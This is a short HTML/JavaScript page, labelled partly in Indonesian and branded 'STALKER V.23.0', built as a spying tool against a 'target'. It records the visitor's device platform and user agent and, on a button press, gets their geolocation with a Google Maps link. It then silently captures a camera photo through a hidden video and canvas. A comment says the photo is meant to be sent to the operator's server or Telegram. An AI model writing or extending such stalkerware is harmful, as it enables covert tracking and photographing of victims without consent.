<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>[ EDWARD OMNI V.23.0 ]</title>
    <style>
        :root { --neon: #0f0; --purple: #bc13fe; --danger: #f00; --bg: #050505; }
        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; text-align: center; padding: 10px; margin:0; }
        .panel { background: #111; border: 1px solid #333; padding: 10px; border-radius: 12px; margin-bottom: 8px; }
        .log-box { font-size: 10px; color: #0f0; background: #000; padding: 10px; border-radius: 5px; height: 120px; overflow-y: auto; text-align: left; border: 1px solid #222; }
        button { background: var(--purple); color: #fff; border: none; padding: 10px; width: 90%; border-radius: 8px; font-weight: bold; margin-top: 5px; }
    </style>
</head>
<body>

    <h2 style="color:var(--purple); margin:0;">STALKER V.23.0</h2>
    <p id="status" style="font-size:10px; color:var(--danger);">[ WAITING FOR TARGET ]</p>

    <div class="panel">
        <h4 style="margin:0; color:var(--neon);">DEVICE INFO</h4>
        <div id="deviceData" style="font-size:9px; color:#fff; text-align:left;">Searching...</div>
    </div>

    <div class="panel">
        <h4 style="margin:0; color:var(--neon);">VICTIM LOG</h4>
        <div class="log-box" id="logBox">> System Active...</div>
    </div>

    <button onclick="startSpy()">AKTIFKAN RADAR PENGINTAI</button>

    <video id="video" width="160" height="120" style="display:none;" autoplay></video>
    <canvas id="canvas" width="160" height="120" style="display:none;"></canvas>

    <script>
        const log = document.getElementById('logBox');
        
        function addLog(msg) {
            log.innerHTML += "> " + msg + "<br>";
            log.scrollTop = log.scrollHeight;
        }

        // 1. AMBIL DATA DEVICE (OTOMATIS)
        function getDeviceInfo() {
            const info = "Model: " + navigator.platform + "\nOS: " + navigator.userAgent.substring(0, 50);
            document.getElementById('deviceData').innerText = info;
            addLog("Device detected: " + navigator.platform);
        }

        // 2. AKTIFKAN SPYING (LOKASI & KAMERA)
        function startSpy() {
            addLog("Requesting Sensors...");
            
            // Ambil Lokasi
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((pos) => {
                    addLog("LOKASI: " + pos.coords.latitude + ", " + pos.coords.longitude);
                    addLog("Google Maps: https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude);
                });
            }

            // Ambil Foto (Silent)
            const video = document.getElementById('video');
            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
                video.srcObject = stream;
                addLog("Camera Linked...");
                setTimeout(() => {
                    takeSnap();
                }, 2000);
            }).catch(err => {
                addLog("Camera Refused!");
            });
        }

        function takeSnap() {
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            context.drawImage(document.getElementById('video'), 0, 0, 160, 120);
            addLog("PHOTO CAPTURED!");
            // Di sini Master bisa kirim file ini ke server/Telegram Master
        }

        getDeviceInfo();
    </script>
</body>
</html>
